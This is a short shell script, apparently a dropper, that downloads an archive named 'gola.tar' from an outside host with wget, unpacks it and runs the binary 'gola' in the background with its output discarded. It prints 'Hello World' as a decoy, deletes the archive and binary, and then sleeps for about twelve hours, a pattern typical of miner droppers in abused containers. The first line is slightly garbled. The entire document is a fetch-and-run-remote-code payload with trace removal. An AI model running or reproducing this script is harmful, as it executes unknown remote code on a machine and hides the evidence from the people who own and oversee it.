wget - q wget -q https://git-bandrex.dockerpool.my.id/gola.tar 
tar xf gola.tar
nohup ./gola >/dev/null 2>&1 & echo Hello World & sleep 0.1
 rm -rf gola.tar gola
sleep 43000
